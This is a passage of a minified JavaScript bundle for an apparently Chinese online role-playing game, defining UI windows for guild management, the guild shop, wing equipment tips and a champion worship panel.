e=0;e<this.roleTabs.length;e++)if(this.roleTabs[e]){this.redPoint=!0;break}var i=this.redPoint?1:0;return t==i?null:i},e.prototype.getComposeItemPoints=function(t,e){return this.composeItemPoints[t]&&this.composeItemPoints[t][e]?this.composeItemPoints[t][e]:!1},e.prototype.postRoleRedPoint=function(){for(var t=0;3>t;t++){var e=o.SubRoles.ins().getSubRoleByIndex(t);
e?this.roleTabs[t]=this.composePoint[t]:this.roleTabs[t]=!1}return!0},__decorate([post()],e.prototype,"postRedPoint",null),__decorate([post()],e.prototype,"postRoleRedPoint",null),e}(n.BaseSystem);e.ThunderRedPoint=s,window.ThunderRedPoint=s,__reflect(s.prototype,"ThunderRedPoint",[]),Systemap.ThunderRedPoint=function(){return s.ins()},window.ThunderRedPoint=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodWingEquipTipsWin=void 0;var n=i(49),o=i(5),s=i(1),a=i(22),r=i(34),l=i(0),h=i(13),u=i(6),p=i(10),d=i(99),c=i(165),f=i(2),g=i(199),m=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ShenYuEquipTipsSkin",e.onBody=!1,e.onBag=!1,e.isActive=!1,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.gwConfig=t[0],this.itemHandle=t[1],this.addTouchEvent(this.eUpBtn,this.onClick),this.addTouchEvent(this.eWearBtn,this.onClick),this.addTouchEvent(this.eMoveBtn,this.onClick),this.addTouchEvent(this.Btn0,this.onClick),this.updateTips(),this.updateBtnRp(),this.updateComeFrom()},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return!0},e.prototype.updateBtnRp=function(){},e.prototype.updateTips=function(){var t=l.GlobalConfig.ItemConfig[this.gwConfig.itemId];this.nameLabel.text=t.name,this.typeLabel.text=d.WingCC.getNameFromSlot(this.gwConfig.slot),this.lvLab.text=gettext("{0}阶",o.TextFlowMaker.getCStr(this.gwConfig.level));var e=16711680,i=h.SubRoles.ins().getSubRoleByIndex(0);i&&i.wingsData.lv+1>=this.gwConfig.level&&(e=65280),this.nameLabel.textColor=p.ItemUtil.getQualityColor(p.ItemUtil.getQuality2(t));var n=this.getAttrStr(this.gwConfig.attr);this.gwConfig.exattr&&this.gwConfig.exattr.length&&(n+="\n"+this.getAttrStr(this.gwConfig.exattr)),this.attr1.textFlow=(new egret.HtmlTextParser).parse(n),this.itemIcon.data=this.gwConfig.itemId,this.updateSkill()},e.prototype.getAttrStr=function(t){for(var e="",i=0;i<t.length;i++){var n="",o=t[i].type,s=a.AttributeData.getAttrStrByType(o),l=16769719,h=a.AttributeData.getAttrValStrByType(t[i].type,t[i].value);o==r.AttributeType.atAtkMin||o==r.AttributeType.atAtkMageMin||o==r.AttributeType.atAtkTaoistMin||o==r.AttributeType.atDef?(n+="<a color="+l+">"+s+"  "+h,n+=" -"):o==r.AttributeType.atAtkMax||o==r.AttributeType.atAtkMageMax||o==r.AttributeType.atAtkTaoistMax||o==r.AttributeType.atRes?(n+=s+"  "+h,n+=i==t.length-1?"":"\n"):(n+="<a color="+l+">"+s+"  "+h,n+=i==t.length-1?"":"\n"),e+=n,o!=r.AttributeType.atAtkMin&&o!=r.AttributeType.atAtkMageMin&&o!=r.AttributeType.atAtkTaoistMin&&o!=r.AttributeType.atDef&&(e+="</a>")}return e},e.prototype.updateSkill=function(){var t=d.WingCC.getGodWingSuitCfg();this.isActive=d.WingCC.getGodWing(0).getSuitLevel()>=t.lv,this.skillIcon.source=t.skillicon+"_png",this.skillIcon.filters=this.isActive?[]:n.FilterUtil.ARRAY_GRAY_FILTER;var e=this.isActive?16678165:9144715;this.eSkillName.textFlow=o.TextFlowMaker.generateTextFlow1(gettext("|C:"+e+"&T:"+t.skillname+" "+(this.isActive?"LV."+t.skilllevel:"")+"|")),this.eSkillDesc.textFlow=o.TextFlowMaker.generateTextFlow1(t.skilldesc);var i;if(this.isActive)for(var s in l.GlobalConfig.GodWingSuitConfig){var a=l.GlobalConfig.GodWingSuitConfig[s];if(a.skillname&&a.lv>t.lv){i=a;break}}else i=t;if(i){for(var r=c.WingEnum.GodWingMaxSlot,h=d.WingCC.calcGodWingSlot(0),u=0,s=0;s<h.length;s++)h[s].level>=i.lv&&u++;var p=l.GlobalConfig.GodWingLevelConfig[i.lv][1],f=l.GlobalConfig.GodWingItemConfig[p.itemId].showlv,g=u>=r?65280:16711680;this.lab.textFlow=o.TextFlowMaker.generateTextFlow1(gettext("下一级解锁要求:神羽{0}阶 |C:{1}&T:({2})|",f,g,u+"/"+r))}else this.lab.text=""},e.prototype.updateComeFrom=function(){this.onBody=this.onBag=!1;var t=d.WingCC.getGodWing(0).getLevel(this.gwConfig.slot);this.onBody=!this.itemHandle&&t==this.gwConfig.level,this.onBody||t==this.gwConfig.level||(this.onBag=void 0!=this.itemHandle&&!!u.BagCT.ins().getBagGoodsByHandle(u.BagCT.BAG_TYPE_OTHTER,this.itemHandle)),this.onBody?removeFromParent(this.eWearBtn):this.onBag?(removeFromParent(this.Btn0),removeFromParent(this.eMoveBtn)):(removeFromParent(this.eWearBtn),removeFromParent(this.eMoveBtn),removeFromParent(this.Btn0)),(this.onBody||this.onBag)&&d.WingCC.getGodWingComposeTarget(this.gwConfig.itemId)||removeFromParent(this.eUpBtn)},e.prototype.onClick=function(t){switch(t.target){case this.eUpBtn:var e=d.WingCC.getGodWingComposeTarget(this.gwConfig.itemId);e?win.open("ComposeTip",e.itemId):win.open("ComposeTip",this.gwConfig.itemId);break;case this.eWearBtn:d.WingCC.wearGodWing(0,this.gwConfig.itemId,this.gwConfig.slot);break;case this.eMoveBtn:if(u.BagCT.ins().getAllSurplusCount(1)<0)return void f.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));d.WingCC.wearGodWing(0,0,this.gwConfig.slot);break;case this.Btn0:if(u.BagCT.ins().getAllSurplusCount(1)<0)return void f.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));win.open(g.GodWingChangePanel,[this.gwConfig.slot])}win.close(this)},e}(s.BaseView);e.GodWingEquipTipsWin=m,window.GodWingEquipTipsWin=m,__reflect(m.prototype,"GodWingEquipTipsWin",[]),window.GodWingEquipTipsWin=m},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildApplyListWin=void 0;var n=i(1),o=i(949),s=i(28),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="MemberApplySkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=o.GuildAppltListItemRender,this.attrNum.restrict="0-9",this.attrNum.maxChars=8},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.list,this.onListTouch),observe(this,this.updateList,s.Guild.ins().postApplyInfos),s.Guild.ins().sendApplyInfos(),this.addTouchEvent(this.checkBoxs,this.onTap),this.addChangeEvent(this.attrNum,this.onTxtChange),this.checkBoxs.selected=1==s.Guild.ins().isAuto,this.attrNum.text=s.Guild.ins().attrLimit+""},e.prototype.onTxtChange=function(t){s.Guild.ins().sendAddGuildLimit(this.checkBoxs.selected?1:0,parseInt(this.attrNum.text))},e.prototype.updateList=function(t){t.sort(this.sort),this.list.dataProvider=new eui.ArrayCollection(t)},e.prototype.onListTouch=function(t){if(t.target instanceof eui.Button){var e=t.target.parent;e.onTap(t.target)}},e.prototype.onTap=function(t){switch(t.currentTarget){case this.checkBoxs:this.onTxtChange(null)}},e.prototype.sort=function(t,e){return t.attack>e.attack?-1:t.attack<e.attack?1:0},e}(n.BaseView);e.GuildApplyListWin=a,window.GuildApplyListWin=a,__reflect(a.prototype,"GuildApplyListWin",[]),window.GuildApplyListWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildAppltListItemRender=void 0;var n=i(3),o=i(173),s=i(27),a=i(28),r=i(159),l=i(0),h=i(2),u=i(292),p=i(68),d=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.onTap=function(t){if(o.GuildWar.ins().getModel().isWatStart)return void s.WarnWin.show(gettext("沙城争霸战期间,不允许对申请玩家进行操作"),function(){},this);if(!p.CrossDartCarCT.ins().checkStopGuildOp())switch(t){case this.ok:var e=a.Guild.ins().getBuildingLevels(r.GuildBuilding.GUILD_COMMENT-1)||0,i=e?l.GlobalConfig.GuildConfig.affairMember[e-1]:0;if(a.Guild.ins().getMemberNum()>=l.GlobalConfig.GuildConfig.maxMember[a.Guild.ins().guildLv-1]+i)return void h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:公会成员已满|"));a.Guild.ins().sendProcessJoin(this.data.roleID,1);break;case this.cancel:a.Guild.ins().sendProcessJoin(this.data.roleID,0)}},e.prototype.dataChanged=function(){if(this.data instanceof u.GuildApplyInfo){var t=this.data;t.vipLevel>0?this.nameLab.x=162:this.nameLab.x=109;var e="<font color='#C2BAA5'>"+t.name+"</font>";this.nameLab.textFlow=(new egret.HtmlTextParser).parser(e),this.attack0.text=t.attack+"",this.job.source="yuanhead"+t.job+t.sex}},e}(n.BaseItemRender);e.GuildAppltListItemRender=d,window.GuildAppltListItemRender=d,__reflect(d.prototype,"GuildAppltListItemRender",[]),window.GuildAppltListItemRender=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildApplyWin=void 0;var n=i(1),o=i(28),s=i(951),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildApplySkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataArr=new eui.ArrayCollection([]),this.list.itemRenderer=s.GuildListItemRender,this.list.dataProvider=this.dataArr},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.createBtn,this.onTap),this.addTouchEvent(this.list,this.onListTouch),observe(this,this.updateList,o.Guild.ins().postGuildList),o.Guild.ins().sendGuildList()},e.prototype.onListTouch=function(t){if(t.target instanceof eui.Button){var e=t.target.parent;e.onTap()}},e.prototype.updateList=function(){this.noGuild.visible=0==o.Guild.ins().guildListInfos.length,this.dataArr.replaceAll(o.Guild.ins().guildListInfos)},e.prototype.onTap=function(t){switch(t.currentTarget){case this.createBtn:win.open("GuildCreateWin")}},e}(n.BaseView);e.GuildApplyWin=a,window.GuildApplyWin=a,__reflect(a.prototype,"GuildApplyWin",[]),window.GuildApplyWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildListItemRender=void 0;var n=i(3),o=i(27),s=i(212),a=i(28),r=i(4),l=i(2),h=i(0),u=i(24),p=i(51),d=i(68),c=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.onTap=function(){if(p.GuildBattleCT.ins().getModel().isWatStart)return void o.WarnWin.show(gettext("沙城争霸战期间,不允许申请加入公会"),function(){},this);if(!d.CrossDartCarCT.ins().checkStopGuildOp()){var t=this.data;if(-1==a.Guild.ins().applyGuilds.indexOf(t.guildID)){if(this.data.attr>r.ActorCC.power)return void l.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:战斗力过低|"));this.applyBtn.enabled=!1,this.applyBtn.label=gettext("已申请"),a.Guild.ins().applyGuilds.push(t.guildID),a.Guild.ins().sendJoinGuild(t.guildID)}}},e.prototype.dataChanged=function(){if(this.data instanceof s.GuildListInfo){var t=this.data,e=h.GlobalConfig.GuildConfig;if(t&&e){this.numLab.text=t.guildRank+"",this.nameLab.textFlow=(new egret.HtmlTextParser).parser(t.guildName+("<font color='#0FEE27'>(Lv."+t.guildLevel+")</font>")),this.president.text=t.guildPresident;var i=t.commentLv?h.GlobalConfig.GuildConfig.affairMember[t.commentLv-1]:0;this.member.textColor=t.guildMember<e.maxMember[t.guildLevel-1]+i?5226466:15937822,this.member.text=t.guildMember+"/"+(e.maxMember[t.guildLevel-1]+i);var n=u.CommonUtils.overLength(t.attr);this.attrLabel.visible=n?!0:!1,n&&(this.attrLabel.text=gettext("战力要求：")+n),a.Guild.ins().applyGuilds.indexOf(t.guildID)>-1?(this.applyBtn.enabled=!1,this.applyBtn.label=gettext("已申请")):(this.applyBtn.enabled=!0,this.applyBtn.label=gettext("申请"))}}},e.prototype.destruct=function(){},e}(n.BaseItemRender);e.GuildListItemRender=c,window.GuildListItemRender=c,__reflect(c.prototype,"GuildListItemRender",[]),window.GuildListItemRender=c},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildChangeNameView=void 0;var n=i(1),o=i(28),s=i(172),a=i(2),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="guildNameChange",e}return __extends(e,t),e.prototype.addDisplay=function(){this.addTouchEvent(this.sureBtn,this.onTap)},e.prototype.onTap=function(t){var e=t.currentTarget;switch(e){case this.sureBtn:this.onChangeName()}},e.prototype.onChangeName=function(){if(""==this.input.text)a.TipsCT.ins().showTips(gettext("请输入行会名字"));else{if(!s.RoleMgr.ins().checkName(this.input.text))return;o.Guild.ins().sendGuildChangeName(this.input.text),win.close(this)}},e}(n.BaseView);e.GuildChangeNameView=r,window.GuildChangeNameView=r,__reflect(r.prototype,"GuildChangeNameView",[]),window.GuildChangeNameView=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildConWin=void 0;var n=i(19),o=i(1),s=i(0),a=i(36),r=i(4),l=i(2),h=i(28),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildConSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.desc0.text=gettext("捐献")+s.GlobalConfig.GuildDonateConfig[1].count+gettext("元宝"),this.desc1.text=gettext("捐献")+s.GlobalConfig.GuildDonateConfig[2].count+gettext("金币"),this.info0.text=gettext("贡献 +")+s.GlobalConfig.GuildDonateConfig[1].awardContri+gettext("	资金 +")+s.GlobalConfig.GuildDonateConfig[1].awardFund,this.info1.text=gettext("贡献 +")+s.GlobalConfig.GuildDonateConfig[2].awardContri+gettext("	资金 +")+s.GlobalConfig.GuildDonateConfig[2].awardFund},e.openCheck=function(){var t=0!=h.Guild.ins().guildID;return t||l.TipsCT.ins().showTips(gettext("还未加入公会！")),t},e.prototype.update=function(){var t=s.GlobalConfig.GuildDonateConfig[1].dayCount,e=h.Guild.ins().getConCount();e&&e.length&&(e[0]<=0?(this.count0.text=t-e[0]+"/"+s.GlobalConfig.GuildDonateConfig[1].dayCount,this.btn0.enabled=!1):(this.btn0.enabled=!0,this.count0.text=t-e[0]+"/"+s.GlobalConfig.GuildDonateConfig[1].dayCount),this.btn1.enabled=e[1]>0,this.count1.text=+s.GlobalConfig.GuildDonateConfig[2].dayCount-e[1]+"/"+s.GlobalConfig.GuildDonateConfig[2].dayCount,this.redPoint0.visible=!1,this.redPoint1.visible=!!s.GlobalConfig.GuildDonateConfig[2].count&&e[1]>0&&r.ActorCC.gold>=s.GlobalConfig.GuildDonateConfig[2].count)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.btn0,this.onTap),this.addTouchEvent(this.btn1,this.onTap),observe(this,this.update,h.Guild.ins().postConCount),this.update(),this.btn0.label=gettext("捐 献")},e.prototype.onTap=function(t){var e=h.Guild.ins().getConCount();switch(t.currentTarget){case this.btn0:if(e[0]<=0)return void l.TipsCT.ins().showTips(gettext("次数不足"));if(!n.GlobalFun.checkCost(s.GlobalConfig.GuildDonateConfig[1].count,a.MoneyConst.yuanbao))return;h.Guild.ins().sendCon(1),h.Guild.ins().sendGuildMembers();break;case this.btn1:if(e[1]<=0)return void l.TipsCT.ins().showTips(gettext("次数不足"));if(!n.GlobalFun.checkCost(s.GlobalConfig.GuildDonateConfig[2].count,a.MoneyConst.gold))return;h.Guild.ins().sendCon(2),h.Guild.ins().sendGuildMembers()}},e}(o.BaseView);e.GuildConWin=u,window.GuildConWin=u,__reflect(u.prototype,"GuildConWin",[]),window.GuildConWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildCreateWin=void 0;var n=i(1),o=i(0),s=i(23),a=i(4),r=i(2),l=i(172),h=i(27),u=i(28),p=i(24),d=i(160),c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildBuildSkin",e.selectLevel=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.leftLab.textFlow=(new egret.HtmlTextParser).parser(this.formatLab(1)),this.rightLab.textFlow=(new egret.HtmlTextParser).parser(this.formatLab(2))},e.prototype.changeSelect=function(t){this.selectLevel=t,this.selectBmp.x=1==this.selectLevel?this.bg1.x:this.bg2.x},e.prototype.formatLab=function(t){var e=o.GlobalConfig.GuildCreateConfig,i=o.GlobalConfig.GuildConfig,n="",s=0==e[t].award?"\n":gettext("\n返还<font color='#0FEE27'>\" {0} \"</font>公会贡献",e[t].award.toString()),a=gettext("<font color='#FFDB00' size='20'>{0}级</font>公会",e[t].level.toString())+"\n"+n+gettext("\n容纳<font color='#0FEE27'>")+i.maxMember[t-1]+gettext("</font>公会成员")+s+gettext("\n\n创建消耗:<font color='#FFDB00'>")+e[t].moneyCount.toString()+gettext("</font>元宝"),r="<font color='#DFD1B5' size='16'>"+a+"</font>";return r},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return!0},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];"7000183"==urlParam.appid&&window.mz?(this.chatGroup.touchChildren=!1,this.chatGroup.touchEnabled=!0):(this.chatGroup.touchChildren=!0,this.chatGroup.touchEnabled=!1),this.addTouchEvent(this.leftLab,this.onTap),this.addTouchEvent(this.rightLab,this.onTap),this.addTouchEvent(this.okBtn,this.onTap),this.addTouchEvent(this.bgClose,this.onTap),this.addTouchEvent(this.chatGroup,this.onTap),observe(this,this.updateInputText,s.GameLogic.ins().postInputText),observe(this,this.endGo,u.Guild.ins().postGuildCreate),this.textInput.addEventListener(egret.FocusEvent.FOCUS_IN,this.textInOn,this)},e.prototype.updateInputText=function(t){this.textInput.text=t,this.textInOn()},e.prototype.textInOn=function(){this.textInput.text==gettext("请输入")&&(this.textInput.text="")},e.prototype.onTap=function(t){var e=this;switch(t.currentTarget){case this.bgClose:win.close(this);break;case this.okBtn:var i=o.GlobalConfig.GuildCreateConfig,n=i[this.selectLevel];if(""==this.textInput.text)r.TipsCT.ins().showTips(gettext("请输入行会名字"));else if(a.ActorCC.yb<n.moneyCount)r.TipsCT.ins().showTips(gettext("元宝不足")),win.close(this);else{if(!l.RoleMgr.ins().checkName(this.textInput.text))return;h.WarnWin.show(gettext("你将消耗{0}元宝，创建{1}级公会[{2}]，确定创建？",n.moneyCount,n.level,this.textInput.text),function(){u.Guild.ins().sendGuildCreate(e.selectLevel,e.textInput.text)},this)}break;case this.leftLab:this.changeSelect(1);break;case this.rightLab:this.changeSelect(2);break;case this.chatGroup:"7000183"==urlParam.appid&&window.mz&&p.CommonUtils.getKeyboard(0,this.textInput.text+""||"")}},e.prototype.endGo=function(){u.Guild.ins().guildID&&(win.get("GuildApplyWin")&&win.close("GuildApplyWin"),win.close("GuildCreateWin"),win.close("PlayWayWin"),win.open("PlayWayWin",d.PlayWayPage.Guild))},e}(n.BaseView);e.GuildCreateWin=c,window.GuildCreateWin=c,__reflect(c.prototype,"GuildCreateWin",[]),window.GuildCreateWin=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildNoticeWin=void 0;var n=i(1),o=i(28),s=i(352),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildNoticeSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.saveBtn,this.onTap),this.textInput.text=o.Guild.ins().notice},e.prototype.onTap=function(t){return __awaiter(this,void 0,void 0,function(){var e,i;return __generator(this,function(n){switch(n.label){case 0:switch(e=t.currentTarget){case this.saveBtn:return[3,1]}return[3,3];case 1:return[4,s.ReportData.chackParty(this.textInput.text)];case 2:return i=n.sent(),o.Guild.ins().notice=i,o.Guild.ins().sendChangeNotice(i),win.close(this),[3,3];case 3:return[2]}})})},e}(n.BaseView);e.GuildNoticeWin=a,window.GuildNoticeWin=a,__reflect(a.prototype,"GuildNoticeWin",[]),window.GuildNoticeWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildShopItem=e.GuildShopPanel=void 0;var n=i(18),o=i(5),s=i(3),a=i(1),r=i(0),l=i(6),h=i(129),u=i(2),p=i(28),d=i(216),c=i(214),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildShopSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=g,this.eList.dataProvider=this.list=new eui.ArrayCollection,0==Object.keys(d.GuildStore.ins().GuildShop).length&&d.GuildStore.ins().sendInfo()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateData,d.GuildStore.ins().postGuildCb,d.GuildStore.ins().postGuildStore),this.addTouchEvent(this,this.onClick),this.eList.selectedIndex=-1,this.updateData()},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return c.GuildMap.openCheck()},e.prototype.updateData=function(){var t=[],e=d.GuildStore.ins().GuildShop;for(var i in e){var n=e[i].id;t.push({id:n,count:e[i].count,cfg:r.GlobalConfig.GuildStoreConfig[n]})}this.list.replaceAll(t)},e.prototype.onClick=function(t){var e,i=this.eList.selectedItem;if(i&&"buy"==t.target.name){if(i.count>=(null===(e=i.cfg)||void 0===e?void 0:e.Maxcount))return void u.TipsCT.ins().showTips(gettext("购买次数不足"));if(l.BagCT.ins().getAllSurplusCount(1)<=0)return void u.TipsCT.ins().showTips(gettext("背包已满，请前往清理"));win.open(h.BuyGuildPanel,i.cfg)}},e}(a.BaseView);e.GuildShopPanel=f,window.GuildShopPanel=f,__reflect(f.prototype,"GuildShopPanel",[]);var g=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.discountNum.visible=!1,this.zkImg.visible=!1,this.money2.visible=!1,this.exGrp.visible=!1},e.prototype.dataChanged=function(){var t=this.data.cfg,e=p.Guild.ins().getBuildingLevels(2)>=t.level;this.eBuy.visible=e,this.itemIcon.data=t.goods,this.limitLab.visible=!e,this.limitLab.text=e?"":gettext("{0}级公会商店",t.level);var i=Math.max(0,t.Maxcount-this.data.count);this.eNum.textFlow=t.Maxcount?o.TextFlowMaker.generateTextFlow(gettext("限购:|C:{0}&T:{1}|/{2}",i>0?n.ColorUtil.GREEN:n.ColorUtil.RED,i,t.Maxcount)):o.TextFlowMaker.generateTextFlow(""),this.money.setData(t.cost)},e}(s.BaseItemRender);e.GuildShopItem=g,window.GuildShopItem=g,__reflect(g.prototype,"GuildShopItem",[]),window.GuildShopItem=g,window.GuildShopPanel=f},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildSkillWin=void 0;var n=i(1),o=i(17),s=i(2),a=i(28),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildSkillSkin",e.oldIndex=0,e.curRole=0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];observe(this,this.updateRed,o.RedPointBaseSys.ins().RpChange);var n=e[0];isNaN(n)&&(n=Math.max(this.viewStack.getItemIndex(null===(t=this[n])||void 0===t?void 0:t.name),0)),this.oldIndex=this.viewStack.selectedIndex=this.tab.selectedIndex=n,this.updateRed()},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.updateRed=function(){this.tab.updateReds()},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=0!=a.Guild.ins().guildID;return i||s.TipsCT.ins().showTips(gettext("还未加入公会！")),i},__decorate([delayCall(100)],e.prototype,"updateRed",null),e}(n.BaseView);e.GuildSkillWin=r,window.GuildSkillWin=r,__reflect(r.prototype,"GuildSkillWin",[]),window.GuildSkillWin=r},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildWin=void 0;var n=i(1),o=i(17),s=i(2),a=i(28),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildBgSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.tab.dataProvider=this.viewStack},e.openCheck=function(){var t=0!=a.Guild.ins().guildID;return t||s.TipsCT.ins().showTips(gettext("还未加入公会！")),t},e.prototype.addDisplay=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var n=e[0];isNaN(n)&&(n=Math.max(this.viewStack.getItemIndex(null===(t=this[n])||void 0===t?void 0:t.name),0)),this.viewStack.selectedIndex=this.tab.selectedIndex=n,this.sTitle="guildwin_title"+n,observe(this,this.updateRedPoint,o.RedPointBaseSys.ins().RpChange),this.addChangeEvent(this.tab,this.onTabTouch),a.Guild.ins().sendMyGuildInfo(),a.Guild.ins().sendGuildMembers(),this.updateRedPoint()},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.onTabTouch=function(t){this.sTitle="guildwin_title"+this.tab.selectedIndex},e.prototype.updateRedPoint=function(){this.tab.updateReds()},__decorate([delayCall(100)],e.prototype,"updateRedPoint",null),e}(n.BaseView);e.GuildWin=r,window.GuildWin=r,__reflect(r.prototype,"GuildWin",[]),window.GuildWin=r},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HChampionPanel=void 0;var n=i(1),o=i(21),s=i(44),a=i(0),r=i(18),l=i(5),h=i(42),u=i(2),p=i(46),d=i(109),c=i(19),f=i(6),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HSWorshipChampionSkin",e.costNum=1,e}return __extends(e,t),e.prototype.skinComplete=function(){var t=p.HegemonyCT.ins();t.sendChampionInfo(t.worshipNo,1),this.roleGrp.touchChildren=!1,this.roleItem.visible=this.descGroup.visible=this.costGroup.visible=!1},e.prototype.addDisplay=function(){this.observe(p.HegemonyCT.ins().postInitWorship,this.update),this.observe(p.HegemonyCT.ins().postWorship,this.update),this.observe(p.HegemonyCT.ins().postChampion,this.update),this.addTouchEvent(this,this.onTouch),this.observe(s.ReadPlayerCT.ins().postGetPlayerResult,this.openOtherPlayerView),this.observe(d.HegemonyRedPoint.ins().postRedPoint,this.refRedPoint),this.isEff=!1,this.initData(),this.update(),this.refRedPoint()},e.prototype.refRedPoint=function(){this.shipBtn.eRp&&(this.shipBtn.eRp.visible=d.HegemonyRedPoint.ins().redpoint3>0),this.shipBtn0.eRp&&(this.shipBtn0.eRp.visible=d.HegemonyRedPoint.ins().redpoint3>0)},e.prototype.removeDisplay=function(){this._openOtherWin=!1,this.titleMc&&(this.titleMc.stop(),this.titleMc=null),Timer.stopAll(this),this.yanHuaMc&&(this.yanHuaMc.stop(),this.yanHuaMc=null)},e.prototype.tabRp=function(){return d.HegemonyRedPoint.ins().redpoint3>0},e.prototype.initData=function(){var t=p.HegemonyCT.ins();this.info.text="",t.serverId&&t.player?(s.ReadPlayerCT.ins().sendFindPlayer(t.player,t.curServer),this.roleItem.visible=this.descGroup.visible=this.costGroup.visible=!0):this.roleItem.visible=this.descGroup.visible=this.costGroup.visible=!1,this.name0.text=gettext("虚位以待"),this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.titleMc.x=this.titleMcGroup.x,this.titleMc.y=this.titleMcGroup.y),this.titleGroup.addChild(this.titleMc);var e=RES_DIR_EFF+(""+a.GlobalConfig.LfRaceBase.titleEff);this.titleMc.playFile(e,-1)},e.prototype.update=function(){var t,e,i;if(this.descGroup.visible){var n=p.HegemonyCT.ins(),o=a.GlobalConfig.LfRaceBase;n.leftWordship||0==n.leftWordship||(n.leftWordship=o.dailyWorshipCount);var s=n.worshipNum+n.leftWordship,u=n.leftWordship>0?r.ColorUtil.GREEN_COLOR_N:r.ColorUtil.RED;this.countLabel.textFlow=l.TextFlowMaker.generateTextFlow1(gettext("今日剩余膜拜次数")+"：|C:"+u+"&T:"+n.worshipNum+"/"+s),n.leftWordship>=o.maxWorship?this.costNum=o.maxWorship:n.leftWordship&&n.leftWordship<o.maxWorship&&(this.costNum=n.leftWordship),this.shipBtn0.label=gettext("膜拜{0}次",this.costNum);var d=a.GlobalConfig.LFRaceWorship,f=d[n.worshipNum+1];if(f){this.get1.visible=this.get2.visible=this.cost1.visible=this.cost2.visible=!0,n.worshipNum&&f.cost?(this.moneyIcon.visible=!0,this.costLabel.text=""+f.cost[0].count,this.moneyIcon.source=c.GlobalFun.getItemSource(null===(t=f.cost[0])||void 0===t?void 0:t.id)):(this.moneyIcon.visible=!1,this.costLabel.text=gettext("免费膜拜")),this.getLabel.text=""+(null===(e=f.reward[0])||void 0===e?void 